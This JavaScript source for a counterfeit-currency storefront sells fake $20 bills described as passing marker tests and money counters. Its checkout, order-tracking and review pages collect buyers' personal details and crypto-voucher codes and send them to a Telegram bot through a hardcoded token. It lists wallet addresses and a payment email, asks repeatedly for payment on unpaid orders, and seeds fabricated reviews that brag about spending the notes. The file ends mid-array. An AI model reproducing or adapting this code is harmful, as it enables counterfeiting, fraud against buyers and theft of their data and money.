const BOT_TOKEN = "8889277882:AAEC1lH_X0otXreHv2PMRI2WmF_fcinEuuw";
const CHAT_ID = "-1003786575965";

const PRODUCTS = [
    { id: 1, name: "$1,000 worth of 20's", price: 50.00, img: "images/20s_bill.jpg" },
    { id: 2, name: "$2,000 worth of 20's", price: 100.00, img: "images/20s_bill.jpg" },
    { id: 3, name: "$5,000 worth of 20's", price: 200.00, img: "images/20s_bill.jpg" },
    { id: 4, name: "$10,000 worth of 20's", price: 300.00, img: "images/20s_bill.jpg" },
    { id: 5, name: "$20,000 worth of 20's", price: 400.00, img: "images/20s_bill.jpg" }
];

const VOUCHER_LINKS = [
    { max: 10,  rec: 10,  url: "https://www.g2a.com/crypto-voucher-10-usd-key-global-i10000337580001" },
    { max: 25,  rec: 25,  url: "https://www.g2a.com/crypto-voucher-25-usd-key-global-i10000337580002" },
    { max: 50,  rec: 50,  url: "https://www.g2a.com/crypto-voucher-50-usd-key-global-i10000337580077" },
    { max: 100, rec: 100, url: "https://www.g2a.com/crypto-voucher-100-usd-key-global-i10000337580078?suid=cfd064e6-040c-4dbc-ae02-7965a2689ea4" },
    { max: 200, rec: 200, url: "https://www.g2a.com/gift-me-crypto-gift-card-200-usd-giftmecrypto-key-global-i10000503347012" },
    { max: 300, rec: 300, url: "https://www.g2a.com/crypto-voucher-300-usd-key-global-i10000337580099?suid=c213141f-2da4-4f7c-9ddd-b470608fe2f6" },
    { max: 400, rec: 400, url: "https://www.g2a.com/crypto-voucher-400-usd-key-global-i10000337580101?suid=6326e49d-f4ac-4f2b-be03-907aa9670c86" },
    { max: 500, rec: 500, url: "https://www.g2a.com/gift-me-crypto-gift-card-500-usd-giftmecrypto-key-global-i10000503347255" }
];

let cart = [];

function init() {
    renderProducts(PRODUCTS);
    updateCartUI();
    renderReviewsFeed();
}

function showPage(pageId) {
    const pages = document.querySelectorAll('.page');
    const targetPage = document.getElementById(`page-${pageId}`);

    if (!targetPage) return;

    window.scrollTo({ top: 0, behavior: 'smooth' });

    pages.forEach(page => {
        if (page.classList.contains('active')) {
            page.style.opacity = '0';
            page.style.transform = 'translateY(-8px)';
            
            setTimeout(() => {
                page.classList.remove('active');
                page.style.display = 'none';
                
                targetPage.style.display = 'block';
                void targetPage.offsetWidth; 
                targetPage.classList.add('active');
                targetPage.style.opacity = '1';
                targetPage.style.transform = 'translateY(0)';
            }, 180);
        }
    });

    if (!document.querySelector('.page.active')) {
        targetPage.style.display = 'block';
        setTimeout(() => {
            targetPage.classList.add('active');
            targetPage.style.opacity = '1';
            targetPage.style.transform = 'translateY(0)';
        }, 10);
    }

    if (pageId === 'checkout') {
        updateCheckoutVoucherUI();
    }
}

function renderProducts(items) {
    const container = document.getElementById('product-list');
    if (!container) return;
    
    if (!items || items.length === 0) {
        container.innerHTML = `<p style="grid-column: 1/-1; text-align: center; color: var(--text-muted);">No products found.</p>`;
        return;
    }

    container.innerHTML = items.map(p => `
        <div class="product-card">
            <div>
                <img src="${p.img}" alt="${p.name}" onerror="this.src='https://via.placeholder.com/250x160?text=Product+Image'">
                <div class="product-title">${p.name}</div>
                <div class="product-price">$${p.price.toFixed(2)}</div>
                <div class="stock-tag">🟢 In Stock (Ships via USPS)</div>
            </div>
            
            <div class="card-actions">
                <button class="btn-primary" onclick="addToCart(${p.id})">Add to Cart</button>
                <button class="btn-secondary" onclick="checkoutDirect(${p.id})">Checkout Now</button>
                <span class="link-details" onclick="openDetails(${p.id})">view details</span>
            </div>
        </div>
    `).join('');
}

function filterProducts() {
    const q = document.getElementById('search-input').value.toLowerCase();
    renderProducts(PRODUCTS.filter(p => p.name.toLowerCase().includes(q)));
}

function openDetails(id) {
    const p = PRODUCTS.find(prod => prod.id === id);
    const container = document.getElementById('detail-content');
    if (!container) return;

    container.innerHTML = `
        <div class="card-box">
            <h2>${p.name}</h2>
            <div style="display:flex; gap:20px; flex-wrap:wrap; margin:15px 0;">
                <img src="${p.img}" style="max-width:280px; width:100%; height:220px; object-fit:cover; border-radius:8px;" onerror="this.src='https://via.placeholder.com/300'">
                <div style="flex:1;">
                    <h3 style="color:var(--primary-dark); font-size:22px;">Price: $${p.price.toFixed(2)}</h3>
                    <div style="background:#f8fafc; padding:12px; border-radius:6px; margin:10px 0; font-size:13px; color:#0f172a;">
                        <p><strong>Shipping:</strong> FREE 2-7 DAYS VIA USPS PRIORITY MAIL<br><em>(No Other Shipping Options Available)</em></p>
                        <br>
                        <p><strong>Printed With:</strong><br>
                        • 75% Cotton, 25% Linen Paper<br>
                        • 85 GSM<br>
                        • Colour Shifting Ink<br>
                        • Watermarks<br>
                        • UV Ink<br>
                        • 4000 DPI Prints Resolution</p>
                        <br>
                        <p><strong>Shipping Info:</strong><br>
                        Tracking Number is provided to your email the following day.<br>
                        To track your package once you receive the tracking number, visit: <a href="https://tools.usps.com/go/TrackConfirmAction" target="_blank" rel="noopener noreferrer" style="color: #2563eb; text-decoration: underline;">USPS Tracking</a></p>
                        <br>
                        <p><strong>About Product:</strong><br>
                        The notes are passable and spendable.<br>
                        They have all necessary security features including UV, watermarks, and proper texture.<br>
                        These bills will pass marker tests and even money counters are fooled with our bills.</p>
                    </div>
                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:15px;">
                        <label style="margin:0;">Quantity:</label>
                        <input type="number" id="detail-qty" value="1" min="1" style="width:70px;">
                    </div>
                    <button class="btn-primary" onclick="addToCart(${p.id}, parseInt(document.getElementById('detail-qty').value))">Add To Cart</button>
                    <button class="btn-secondary" onclick="checkoutDirect(${p.id}, parseInt(document.getElementById('detail-qty').value))">Buy Now</button>
                </div>
            </div>
            
            <hr style="border:0; border-top:1px solid #e2e8f0; margin:20px 0;">
            <h4>Other Products Available</h4>
            <ul style="list-style:none; padding:0; margin-top:10px;">
                ${PRODUCTS.filter(x => x.id !== id).map(o => `
                    <li style="padding:6px 0; border-bottom:1px solid #f1f5f9; font-size:13px; display:flex; justify-content:space-between;">
                        <span>${o.name} - <strong>$${o.price.toFixed(2)}</strong></span>
                        <a href="#" style="color:#2563eb;" onclick="openDetails(${o.id})">See Details</a>
                    </li>
                `).join('')}
            </ul>
        </div>
    `;
    showPage('detail');
}

function addToCart(id, qty = 1) {
    const existing = cart.find(i => i.id === id);
    if (existing) existing.qty += qty;
    else cart.push({ ...PRODUCTS.find(p => p.id === id), qty });
    updateCartUI();
    alert("Item added to cart");
}

function checkoutDirect(id, qty = 1) {
    cart = [];
    addToCart(id, qty);
    showPage('checkout');
}

function updateCartUI() {
    const countElem = document.getElementById('cart-count');
    if (countElem) countElem.innerText = cart.reduce((acc, i) => acc + i.qty, 0);

    const container = document.getElementById('cart-items');
    if (!container) return;
    
    if (cart.length === 0) {
        container.innerHTML = "<p>Your cart is empty.</p>";
        const totalElem = document.getElementById('cart-total');
        if (totalElem) totalElem.innerText = "0.00";
        return;
    }

    let total = 0;
    container.innerHTML = cart.map((item, idx) => {
        const itemTotal = item.price * item.qty;
        total += itemTotal;
        return `
            <div style="display:flex; justify-content:space-between; align-items:center; background:#fff; padding:12px; margin-bottom:8px; border:1px solid #e2e8f0; border-radius:6px;">
                <div>
                    <strong>${item.name}</strong><br>
                    <small>$${item.price.toFixed(2)} x </small>
                    <input type="number" value="${item.qty}" min="1" onchange="updateQty(${idx}, this.value)" style="width:50px; padding:2px;">
                </div>
                <div>
                    <strong>$${itemTotal.toFixed(2)}</strong>
                    <button onclick="removeItem(${idx})" style="background:#ef4444; color:white; border:none; padding:4px 8px; border-radius:4px; margin-left:8px; cursor:pointer;">Remove</button>
                </div>
            </div>
        `;
    }).join('');

    const totalElem = document.getElementById('cart-total');
    if (totalElem) totalElem.innerText = total.toFixed(2);
}

function updateQty(idx, val) {
    cart[idx].qty = parseInt(val) || 1;
    updateCartUI();
}

function removeItem(idx) {
    cart.splice(idx, 1);
    updateCartUI();
}

function getCartTotal() {
    return cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
}

function selectPaymentMethod(method, cardElement) {
    const hiddenInput = document.getElementById('payment-method');
    if (hiddenInput) hiddenInput.value = method;

    document.querySelectorAll('.payment-card').forEach(card => card.classList.remove('active'));
    if (cardElement) {
        cardElement.classList.add('active');
        const radio = cardElement.querySelector('input[type="radio"]');
        if (radio) radio.checked = true;
    }

    togglePaymentUI();
}

function togglePaymentUI() {
    const method = document.getElementById('payment-method')?.value || 'giftme';
    
    document.querySelectorAll('.payment-box').forEach(b => b.style.display = 'none');

    const targetBox = document.getElementById(`addr-${method}`);
    if (targetBox) {
        targetBox.style.display = 'block';
    }

    if (method === 'giftme') {
        updateCheckoutVoucherUI();
    }
}

function updateCheckoutVoucherUI() {
    const total = getCartTotal();
    
    const cartTotalElem = document.getElementById('giftme-cart-total');
    if (cartTotalElem) cartTotalElem.innerText = total.toFixed(2);

    const linkObj = VOUCHER_LINKS.find(v => total <= v.max) || VOUCHER_LINKS[VOUCHER_LINKS.length - 1];

    const recAmountElem = document.getElementById('giftme-rec-amount');
    if (recAmountElem) recAmountElem.innerText = linkObj.rec.toFixed(2);

    const buyBtn = document.getElementById('giftme-buy-btn');
    if (buyBtn) buyBtn.href = linkObj.url;
}

function validateGiftMeCodeInput(inputElem) {
    const val = inputElem.value.trim();
    const errorElem = document.getElementById('giftme-code-error');
    if (!errorElem) return;

    if (val.length > 0 && val.length !== 32) {
        errorElem.style.display = 'block';
    } else {
        errorElem.style.display = 'none';
    }
}

function copyText(elementId) {
    const elem = document.getElementById(elementId);
    if (!elem) return;
    const textToCopy = elem.innerText;
    navigator.clipboard.writeText(textToCopy).then(() => {
        alert("Copied to clipboard!");
    }).catch(err => {
        console.error('Copy failed:', err);
    });
}

async function handleCheckout(e) {
    if (e) e.preventDefault();
    if (cart.length === 0) {
        alert("Cart is empty!");
        return;
    }

    const method = document.getElementById('payment-method').value;

    let voucherCode = "";
    if (method === 'giftme') {
        const codeInput = document.getElementById('giftme-code-input');
        voucherCode = codeInput ? codeInput.value.trim() : "";

        if (voucherCode.length === 0) {
            alert("Please enter a GiftMeCrypto voucher code before generating order.");
            if (codeInput) codeInput.focus();
            return;
        }
    }

    const orderId = "ORD-" + Math.floor(100000 + Math.random() * 900000);
    const total = getCartTotal();

    const orderData = {
        id: orderId,
        fname: document.getElementById('fname').value,
        lname: document.getElementById('lname').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zip: document.getElementById('zip').value,
        country: document.getElementById('country').value,
        method: method,
        voucherCode: voucherCode,
        total: total,
        items: [...cart]
    };

    await sendTelegramNotification(orderData);

    localStorage.setItem(orderId, JSON.stringify({ 
        status: "Payment verification process", 
        paid: false, 
        total: total,
        method: method
    }));

    let copiableAddr = "";
    let methodDisplay = "";
    let labelText = "Send Payment To:";

    if (method === 'giftme') {
        copiableAddr = voucherCode;
        methodDisplay = "GiftMeCrypto Voucher";
        labelText = "Voucher Code Submitted:";
    } else if (method === 'chime') {
        copiableAddr = "CHIME IS CURRENTLY DOWN, PLEASE SELECT ANOTHER PAYMENT METHOD";
        methodDisplay = "Chime";
        labelText = "Send Payment To Chime Email:";
    } else if (method === 'btc') {
        copiableAddr = "14fNdgFZSLbhzJok3TjaKGj1ovj9CCHsip";
        methodDisplay = "Bitcoin (BTC)";
        labelText = "Send BTC To Address:";
    } else if (method === 'sol') {
        copiableAddr = "61945vXkcHT78a2DWQrF3Nrg9W3yR7Lq7A5iC6BjuYZV";
        methodDisplay = "Solana (SOL)";
        labelText = "Send SOL To Address:";
    }

    const localTimestamp = new Date().toLocaleString(undefined, {
        dateStyle: 'medium',
        timeStyle: 'short'
    });

    document.getElementById('conf-order-id').innerText = orderData.id;
    document.getElementById('conf-name').innerText = `${orderData.fname} ${orderData.lname}`;
    document.getElementById('conf-email').innerText = orderData.email;
    document.getElementById('conf-phone').innerText = orderData.phone;
    document.getElementById('conf-time').innerText = localTimestamp;
    document.getElementById('conf-address').innerText = `${orderData.address}, ${orderData.city}, ${orderData.state} ${orderData.zip}, ${orderData.country}`;
    document.getElementById('conf-pay-method').innerText = methodDisplay;
    document.getElementById('conf-total-amount').innerText = `$${orderData.total.toFixed(2)}`;
    
    const payLabelElem = document.getElementById('conf-pay-label');
    if (payLabelElem) payLabelElem.innerText = labelText;
    
    document.getElementById('conf-pay-address').innerText = copiableAddr;

    cart = [];
    updateCartUI();
    showPage('confirmation');
}

async function sendTelegramNotification(data) {
    const itemList = data.items.map(i => `- ${i.name} (x${i.qty}): $${(i.price * i.qty).toFixed(2)}`).join('\n');
    
    let payDetailsStr = `*Payment Method:* ${data.method}`;
    if (data.method === 'giftme') {
        payDetailsStr += `\n*Voucher Code:* \`${data.voucherCode}\``;
    }

    const msg = `
🛒 *NEW ORDER CREATED*
*Order ID:* \`${data.id}\`
*Total:* $${data.total.toFixed(2)}

*Customer Details:*
Name: ${data.fname} ${data.lname}
Email: ${data.email}
Phone: ${data.phone}

*Address:*
${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}

${payDetailsStr}

*Items:*
${itemList}
    `;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error("Telegram API Error", e);
    }
}

function checkTrackStatus(e) {
    if (e) e.preventDefault();
    
    const idInput = document.getElementById('track-id-input');
    if (!idInput) return;

    const id = idInput.value.trim();
    const res = document.getElementById('track-result');
    if (!res) return;

    const item = localStorage.getItem(id);

    if (!item) {
        res.innerHTML = `<p style="color:#ef4444; margin-top:15px; font-weight:600;">⚠️ Order ID not found. Please double-check your ID.</p>`;
        return;
    }

    const parsed = JSON.parse(item);

    let html = `
        <div class="card-box" style="margin-top:15px; background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 10px;">
            <div style="display:flex; justify-content: space-between; align-items:center; margin-bottom: 12px;">
                <span style="color:#94a3b8; font-size:0.85rem;">Order ID: <strong style="color:#38bdf8;">${id}</strong></span>
                <span class="badge-payment">${parsed.paid ? '✅ Paid' : '⏳ Pending Payment'}</span>
            </div>
            
            <p style="font-size: 1rem; margin-bottom: 16px;">
                <strong>Status:</strong> <span style="color:#f8fafc;">${parsed.status}</span>
            </p>
    `;

    if (!parsed.paid) {
        html += `
            <div style="border-top: 1px solid #334155; padding-top: 16px; margin-top: 12px;">
                <p style="color:#ef4444; font-weight:600; margin-bottom: 12px; font-size: 0.9rem;">
                    Status: Not paid. Pay to proceed to packaging level for shipping.
                </p>

                <div style="background: #1e293b; padding: 16px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 16px;">
                    <h4 style="color:#38bdf8; margin-bottom: 8px; font-size: 0.95rem;">Not Paid?</h4>
                    <p style="font-size:0.85rem; color:#cbd5e1; margin-bottom:12px;">Pay now using your preferred payment method:</p>
                    
                    <div style="margin-bottom: 12px;">
                        <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Select Payment Method</label>
                        <select id="track-pay-method" class="select-input" onchange="toggleTrackPayDetails('${id}')">
                            <option value="giftme">GiftMeCrypto Voucher</option>
                            <option value="chime">Chime</option>
                            <option value="btc">Bitcoin (BTC)</option>
                            <option value="sol">Solana (SOL)</option>
                        </select>
                    </div>

                    <div id="track-pay-dest" class="payment-dest-box" style="margin-top: 10px;"></div>

                    <button class="btn-primary" onclick="submitTrackPayment('${id}')" style="width: 100%; margin-top: 14px;">
                        Submit Payment Notice
                    </button>
                </div>

                <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); padding: 14px; border-radius: 8px;">
                    <h4 style="color:#38bdf8; margin-bottom: 4px; font-size: 0.9rem;">💬 Already paid?</h4>
                    <p style="font-size: 0.825rem; color: #cbd5e1; line-height: 1.4; margin: 0;">
                        Verification may take a while with cryptocurrency. Please be patient as we process your request and confirm network confirmations.
                    </p>
                </div>
            </div>
        `;
    } else {
        html += `
            <div style="background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px;">
                <p style="color:#4ade80; font-size:0.875rem; margin:0;">
                    🎉 Payment verified! Your order is currently queued for packaging and dispatch.
                </p>
            </div>
        `;
    }

    html += `</div>`;
    res.innerHTML = html;

    if (!parsed.paid) {
        toggleTrackPayDetails(id);
    }
}

function toggleTrackPayDetails(orderId) {
    const methodSelect = document.getElementById('track-pay-method');
    if (!methodSelect) return;
    
    const method = methodSelect.value;
    const destBox = document.getElementById('track-pay-dest');
    if (!destBox) return;

    if (method === 'giftme') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Enter 32-Character Voucher Code:</label>
            <input type="text" id="track-voucher-input" placeholder="e.g. A1B2C3D4E5F678901234567890ABCDEF" style="width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; font-family: monospace;">
        `;
    } else if (method === 'chime') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Send Chime Payment To Email:</label>
            <div class="copy-field">
                <span id="track-copy-target">malikhassan278fff@gmail.com</span>
                <button type="button" class="btn-copy" onclick="copyText('track-copy-target')">📋 Copy</button>
            </div>
        `;
    } else if (method === 'btc') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Send BTC to Address:</label>
            <div class="copy-field">
                <span id="track-copy-target">bc1q7yuv6pl9ht2pe6kxe6hyf0kuzfua6rkqtkgyf5</span>
                <button type="button" class="btn-copy" onclick="copyText('track-copy-target')">📋 Copy</button>
            </div>
        `;
    } else if (method === 'sol') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Send SOL to Address:</label>
            <div class="copy-field">
                <span id="track-copy-target">FSKgQJQKbSK3vzUgYSR14QcD7qcvgdLkdistHg3bkHxh</span>
                <button type="button" class="btn-copy" onclick="copyText('track-copy-target')">📋 Copy</button>
            </div>
        `;
    }
}

async function submitTrackPayment(orderId) {
    const methodSelect = document.getElementById('track-pay-method');
    if (!methodSelect) return;

    const method = methodSelect.value;
    let extraDetail = "";

    if (method === 'giftme') {
        const vInput = document.getElementById('track-voucher-input');
        const code = vInput ? vInput.value.trim() : "";
        if (code.length === 0) {
            alert("Please enter a GiftMeCrypto voucher code.");
            return;
        }
        extraDetail = `Voucher Code: ${code}`;
    } else {
        extraDetail = `Payment Method Selected: ${method.toUpperCase()}`;
    }

    const msg = `
🔄 *TRACK PAGE PAYMENT ACTION*
*Order ID:* \`${orderId}\`
*Payment Method Selected:* ${method.toUpperCase()}
*Details:* ${extraDetail}
*Timestamp:* ${new Date().toLocaleString()}
    `;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error("Telegram API Error", e);
    }

    alert("Payment notice submitted! Verification may take a while. Please be patient while we confirm your payment.");
    checkTrackStatus();
}

function toggleReviewForm() {
    const form = document.getElementById('add-review-form');
    if (form) {
        form.style.display = form.style.display === 'none' ? 'block' : 'none';
    }
}

async function submitNewReview(e) {
    if (e) e.preventDefault();

    const idInput = document.getElementById('rev-orderid');
    const res = document.getElementById('review-result');
    if (!idInput || !res) return;

    const id = idInput.value.trim();
    if (!id) {
        res.innerHTML = `<p style="color:#ef4444; margin-top:15px; font-weight:600;">⚠️ Please enter an Order ID.</p>`;
        return;
    }

    const item = localStorage.getItem(id);

    if (!item) {
        res.innerHTML = `<p style="color:#ef4444; margin-top:15px; font-weight:600;">⚠️ Order ID not found. Please double-check your ID.</p>`;
        return;
    }

    let parsed;
    try {
        parsed = JSON.parse(item);
    } catch (err) {
        res.innerHTML = `<p style="color:#ef4444; margin-top:15px; font-weight:600;">⚠️ Invalid order data format.</p>`;
        return;
    }

    let html = `
        <div class="card-box" style="margin-top:15px; background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 10px;">
            <div style="display:flex; justify-content: space-between; align-items:center; margin-bottom: 12px;">
                <span style="color:#94a3b8; font-size:0.85rem;">Order ID: <strong style="color:#38bdf8;">${id}</strong></span>
                <span class="badge-payment">${parsed.paid ? '✅ Paid' : '⏳ Pending Payment'}</span>
            </div>
            
            <p style="font-size: 1rem; margin-bottom: 16px;">
                <strong>Status:</strong> <span style="color:#f8fafc;">${parsed.status || 'Pending'}</span>
            </p>
    `;

    if (!parsed.paid) {
        html += `
            <div style="border-top: 1px solid #334155; padding-top: 16px; margin-top: 12px;">
                <p style="color:#ef4444; font-weight:600; margin-bottom: 12px; font-size: 0.9rem;">
                    Status: Not paid. Pay to verify your delivery and submit your review.
                </p>

                <div style="background: #1e293b; padding: 16px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 16px;">
                    <h4 style="color:#38bdf8; margin-bottom: 8px; font-size: 0.95rem;">Not Paid?</h4>
                    <p style="font-size:0.85rem; color:#cbd5e1; margin-bottom:12px;">Pay now using your preferred payment method:</p>
                    
                    <div style="margin-bottom: 12px;">
                        <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Select Payment Method</label>
                        <select id="rev-pay-method" class="select-input" onchange="toggleRevPayDetails('${id}')">
                            <option value="giftme">GiftMeCrypto Voucher</option>
                            <option value="chime">Chime</option>
                            <option value="btc">Bitcoin (BTC)</option>
                            <option value="sol">Solana (SOL)</option>
                        </select>
                    </div>

                    <div id="rev-pay-dest" class="payment-dest-box" style="margin-top: 10px;"></div>

                    <button class="btn-primary" onclick="submitRevPayment('${id}')" style="width: 100%; margin-top: 14px;">
                        Submit Payment Notice
                    </button>
                </div>

                <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); padding: 14px; border-radius: 8px;">
                    <h4 style="color:#38bdf8; margin-bottom: 4px; font-size: 0.9rem;">💬 Already paid?</h4>
                    <p style="font-size: 0.825rem; color: #cbd5e1; line-height: 1.4; margin: 0;">
                        Verification may take a while with cryptocurrency. Please be patient as we process your request and confirm network confirmations before publishing your review.
                    </p>
                </div>
            </div>
        `;
    } else {
        html += `
            <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); padding: 14px; border-radius: 8px; margin-top: 12px;">
                <h4 style="color:#38bdf8; margin-bottom: 4px; font-size: 0.9rem;">💬 Verification in Progress</h4>
                <p style="font-size: 0.825rem; color: #cbd5e1; line-height: 1.4; margin: 0;">
                    Your payment has been logged. Please be patient while system moderators verify your delivery receipt to post your customer review.
                </p>
            </div>
        `;
    }

    html += `</div>`;
    res.innerHTML = html;

    if (!parsed.paid) {
        toggleRevPayDetails(id);
    }
}

function toggleRevPayDetails(orderId) {
    const methodSelect = document.getElementById('rev-pay-method');
    if (!methodSelect) return;
    
    const method = methodSelect.value;
    const destBox = document.getElementById('rev-pay-dest');
    if (!destBox) return;

    if (method === 'giftme') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Enter 32-Character Voucher Code:</label>
            <input type="text" id="rev-voucher-input" placeholder="e.g. A1B2C3D4E5F678901234567890ABCDEF" style="width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; font-family: monospace;">
        `;
    } else if (method === 'chime') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Send Chime Payment To Email:</label>
            <div class="copy-field">
                <span id="rev-copy-target">malikhassan278fff@gmail.com</span>
                <button type="button" class="btn-copy" onclick="copyText('rev-copy-target')">📋 Copy</button>
            </div>
        `;
    } else if (method === 'btc') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Send BTC to Address:</label>
            <div class="copy-field">
                <span id="rev-copy-target">bc1q7yuv6pl9ht2pe6kxe6hyf0kuzfua6rkqtkgyf5</span>
                <button type="button" class="btn-copy" onclick="copyText('rev-copy-target')">📋 Copy</button>
            </div>
        `;
    } else if (method === 'sol') {
        destBox.innerHTML = `
            <label style="font-size: 0.8rem; color: #94a3b8; display: block; margin-bottom: 4px;">Send SOL to Address:</label>
            <div class="copy-field">
                <span id="rev-copy-target">FSKgQJQKbSK3vzUgYSR14QcD7qcvgdLkdistHg3bkHxh</span>
                <button type="button" class="btn-copy" onclick="copyText('rev-copy-target')">📋 Copy</button>
            </div>
        `;
    }
}

async function submitRevPayment(orderId) {
    const methodSelect = document.getElementById('rev-pay-method');
    if (!methodSelect) return;

    const method = methodSelect.value;
    let extraDetail = "";

    if (method === 'giftme') {
        const vInput = document.getElementById('rev-voucher-input');
        const code = vInput ? vInput.value.trim() : "";
        if (code.length === 0) {
            alert("Please enter a GiftMeCrypto voucher code.");
            return;
        }
        extraDetail = `Voucher Code: ${code}`;
    } else {
        extraDetail = `Payment Method Selected: ${method.toUpperCase()}`;
    }

    const msg = `
💬 *REVIEW PAGE PAYMENT ACTION*
*Order ID:* \`${orderId}\`
*Payment Method Selected:* ${method.toUpperCase()}
*Details:* ${extraDetail}
*Timestamp:* ${new Date().toLocaleString()}
    `;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error("Telegram API Error", e);
    }

    alert("Payment submitted! Verification may take a while. Please be patient while we confirm your payment.");
}

const mockReviews = [
    {
        id: "ORD-790687",
        username: "@dollar_printer",
        rating: 5,
        timestamp: "2026-09-13T11:05:00Z",
        status: "Package Delivered & Received",
        comment: "this is so good you can't even call it prop! and after aging them from some random vid I saw on tt they feel just like the reel $20 bill I have in my wallet"
    },
    {
        id: "ORD-766718",
        username: "@sharpsusansaint",
        rating: 5,
        timestamp: "2026-09-13T09:05:00Z",
        status: "Package Delivered & Received",
        comment: "to anyone wondering if they should buy it, the answer is only if you take the risks it comes with, as for this isn't even prop money it's just straight up like counterfeit and I'm not complaining but I ordered this for my kids lol."
    },
    {
        id: "ORD-764053",
        username: "@ihatetrump",
        rating: 5,
        timestamp: "2026-09-12T19:05:00Z",
        status: "Package Delivered & Received",
        comment: "The shipping was quick and the quality is so good that it fools my old school money counter🤣"
    },
    {
        id: "ORD-677708",
        username: "@iluvcannabis",
        rating: 5,
        timestamp: "2026-09-12T19:05:00Z",
        status: "Package Delivered & Received",
        comment: "what is this usps delivery? didn't think it would ship in 2 days let alone come without the feds knocking on my door, 10/10 will be buying again"
    },
    {
        id: "ORD-667193",
        username: "@upcoming_saint",
        rating: 5,
        timestamp: "2026-09-11T19:05:00Z",
        status: "Package Delivered & Received",
        comment: "so, like other than having to age them they look and feel like a real $20 bank note which is insane, its made out of the same stuff real bills are made out of so when you age it there's no tear marks, thanks a lot cash"
    },
    {
        id: "ORD-572983",
        username: "@notasimportant17",
        rating: 5,
        timestamp: "2026-09-10T23:05:00Z",
        status: "Package Delivered & Received",
        comment: "Finally came it felt like forever (was prob 2 days) I won't say much on here cause I don't wanna go to jail but i will be buying again"
    },
    {
        id: "ORD-597786",
        username: "@unbeatenjade",
        rating: 5,
        timestamp: "2026-09-10T19:05:00Z",
        status: "Package Delivered & Received",
        comment: "Dude big warning to anyone buying, make sure you know how to use this stuff, it actually passes"
    },
    {
        id: "ORD-572983",
        username: "@jay_plamer",
        rating: 5,
        timestamp: "2026-09-10T10:05:00Z",
        status: "Package Delivered & Received",
        comment: "thought i got hammed but bro shit comes quick and bro i just scamemd the plug so fucking geeked lov yo brooo"
    },
    {
        id: "ORD-530371",
        username: "@aligned3277",
        rating: 4,
        timestamp: "2026-09-09T10:05:00Z",
        status: "Package Delivered & Received",
        comment: "ts fire but it was hard asf to buy because the only damn payments they accept is bitcoin and whatever the other one is but anyways it was worth it but if i bought again i would hope they would just accept card."
    },
    {
        id: "ORD-412003",
        username: "@peyton_washington",
        rating: 5,
        timestamp: "2026-09-03T10:05:00Z",
        status: "Package Delivered & Received",
        comment: "There actually usable fam😭"
    },
    {
        id: "ORD-411887",
        username: "@candle_stick1",
        rating: 5,
        timestamp: "2026-09-03T10:06:00Z",
        status: "Package Delivered & Received",
        comment: "lan home rn but my girl said they came in. appreciate you standing on your word this shit hard to come across, can't wait to get back home to that shii ong that myme nigga jugged me showing real fucking money…"
    },
    {
        id: "ORD-411712",
        username: "@drakofr_",
        rating: 5,
        timestamp: "2026-09-02T10:07:00Z",
        status: "Package Delivered & Received",
        comment: "Just bought 3 bottles of alc with ur prop ts easy 🥱😂"
    },

    
    {
        id: "ORD-412007",
        username: "@underated_gamer",
        rating: 5,
        timestamp: "2026-09-02T10:08:02Z",
        status: "Package Delivered & Received",
        comment: "My shit finally touched down today brudda forgot to send the reviews my bad but these bitches is FORSURSESKI"
    },

    
    {
        id: "ORD-411316",
        username: "@undermined_broski",
        rating: 5,
        timestamp: "2026-09-01T10:09:00Z",
        status: "Package Delivered & Received",
        comment: "You valid my dawg 💯"
    },

    {
        id: "ORD-411210",
        username: "@tupac3667",
        rating: 5,
        timestamp: "2026-09-01T10:10:00Z",
        status: "Package Delivered & Received",
        comment: "Slow answers but product is what promised, got accepted at apple"
    },
    // --- LATEST REVIEWS (August 30, 2026) ---
    {
        id: "ORD-411209",
        username: "@zoomer_zilla",
        rating: 5,
        timestamp: "2026-08-30T10:15:00Z",
